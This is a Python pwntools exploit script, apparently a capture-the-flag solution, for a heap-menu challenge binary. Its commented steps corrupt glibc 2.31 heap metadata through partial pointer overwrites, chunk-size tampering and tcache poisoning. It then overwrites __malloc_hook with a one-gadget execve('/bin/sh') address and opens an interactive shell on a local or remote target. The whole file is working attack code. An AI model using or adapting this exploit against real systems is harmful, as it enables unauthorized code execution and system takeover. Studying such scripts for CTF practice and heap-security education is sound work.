#!/usr/bin/env python3

from pwn import *
import argparse
from pathlib import Path

io = None

PROMPT = b'Choice: '

def malloc(size):
    io.sendlineafter(PROMPT, b'1')
    io.sendlineafter(b'Size: ', str(size).encode())
    io.recvuntil(b'ID#')
    return int(io.recvuntil(b')', drop=True), 10)

def edit(idx, data):
    io.sendlineafter(PROMPT, b'2')
    io.sendlineafter(b'WOM ID: ', str(idx).encode())
    io.sendafter(b'Content: ', data)

def free(idx):
    io.sendlineafter(PROMPT, b'3')
    io.sendlineafter(b'WOM ID: ', str(idx).encode())


def pop():
    io.recvuntil(b'Auditing Compliance Tag: ')
    leak = int(io.recvuntil(b'\n', drop=True), 10)

    free(malloc(0x38)) # align heap so that, later, chunk A lands at base + 0x300
    U = malloc(0x418)  # large enough to not be tcached and land in the unsorted bin
    _ = malloc(0x18)   # guard chunk

    free(U)            # freeing writes a libc pointer to the fd (and bk) of U

    V = malloc(0x18)   # padding
    A = malloc(0x18)   # chunk U is remainder'd to provide this chunk, so
                       # the first 8 bytes are the old unsorted fd, pointing
                       # into the main arena, in libc's rw section.

    ###

    edit(A, b'\x70')   # overwrite just the least significant byte of the old fd
                       # pointer. This is the address of the __malloc_hook!

    B = malloc(0x18)   # next, we need to manipulate chunk C's size so that we can
    C = malloc(0x18)   # manipulate chunk D's fd pointer, once free'd, to manipulate
    D = malloc(0x18)   # the tcache. The goal is to get A, with our hook pointer
    E = malloc(0x18)   # into the tache without actually freeing it.
    F = malloc(0x18)

    edit(B, bytes(0x18) + b'\x41')  # make C bigger
    free(C)
    C = malloc(0x38)                # alloc our bigger C

    free(F)
    free(E)
    free(D)

    # Before:
    # tcache chain: D -> E -> F

    edit(C, bytes(0x18) + pack(0x21) + bytes(1))

    # After:
    # tcache chain: D -> E -> __malloc_hook

    D = malloc(0x18) # 0x..360
    A = malloc(0x18) # 0x..300
    T = malloc(0x18) # __malloc_hook

    # Okay, now we have a pointer to the __malloc_hook, but it is zeroed out.
    # We can write whatever we want, but we don't have any leaks.
    # I need the allocator to write another libc pointer. However, I cannot free
    # this chunk, since it it WAAAY beyond the top chunk, and a mitigation
    # will abort the process.
    #
    # However, tcache bins don't have that mitigation. So, if I can get another
    # chunk allocated to libc, and free it, any chunk freed after it will use
    # that as its next pointer.
    #
    # Let's do that.

    ###

    # Here, lets repeat the previous trick to get another chunk, this time
    # 0x10 bytes behind the __malloc_hook. Luckily, the thing right behind
    # that is the __realloc_hook, and it is populated with a libc pointer.
    # So, if we free that one first, this libc pointer will be mistaken for
    # an fd, and written to the tcache_perthread_struct.

    edit(A, b'\x60')

    E = malloc(0x18)
    F = malloc(0x18)

    free(F)
    free(E)
    free(D)

    edit(C, bytes(0x18) + pack(0x21) + bytes(1))

    D = malloc(0x18) # 0x360
    A = malloc(0x18) # 0x300
    S = malloc(0x18) # __remalloc_hook

    ###

    # This S chunk, right behind our __malloc_hook chunk, T, will use for
    # two purposes. First, we need to write a fake chunk size here. Otherwise,
    # _int_free() will get mad and trigger a mitigation.
    # Second, we'll use it to overwrite a few bytes of the libc pointer that
    # gets written there, when we free.

    edit(S, b'S'*8 + pack(0x21))
    free(T) # Now that it has a size, we can free() it.
            # This causes that libc pointer we smuggled into the
            # tcache_perhread_struct to be used as this chunk's fd.

    # Now, what to write?

    # Our 2.31 glibc has a good gadget:
    #
    # 0xe3b01 execve("/bin/sh", r15, rdx)
    # constraints:
    #   [r15] == NULL || r15 == NULL || r15 is a valid argv
    #   [rdx] == NULL || rdx == NULL || rdx is a valid envp

    # Our simple program doesn't use r15, so that is NULL, and we can control
    # the value of rdx. That happens to be where our malloc size ends up.

    # The value already writen to __malloc_hook is almost right.
    # The leak, at the start of the program, gives the missing 12 bits.
    edit(S, b'S'*8 + pack(0x21) + pack((leak<<12) + 0x82b01, 24))

    ###

    # time to trigger a malloc!
    # Be sure to send 0, since that ends up in rdx.
    io.sendlineafter(PROMPT, b'1')
    io.sendlineafter(b'Size: ', b'0')


def parse_args():
    p = argparse.ArgumentParser(description='Pop!')
    p.add_argument('binary', nargs='?', default=None,      help='Path to the target binary')
    p.add_argument('--remote', '-r', action='store_true',  help='Pop remote binary')
    p.add_argument('--host', default='localhost',          help='Remote IP/hostname')
    p.add_argument('--port', default=1337, type=int,       help='Remote port')
    p.add_argument('--log-level', choices=['debug', 'info', 'warn', 'warning', 'error', 'critical'], help='Set log level')
    return p.parse_args()


def main():
    global io

    args = parse_args()
    target = Path(args.binary) if args.binary else Path(__file__).resolve().with_suffix(".bin")
    context.log_level = args.log_level if args.log_level else 'error'
    context.binary = elf = ELF(target, checksec=False)
    io = remote(args.host, args.port) if args.remote else process([elf.path])

    pop()

    io.interactive()



if __name__ == '__main__':
    main()

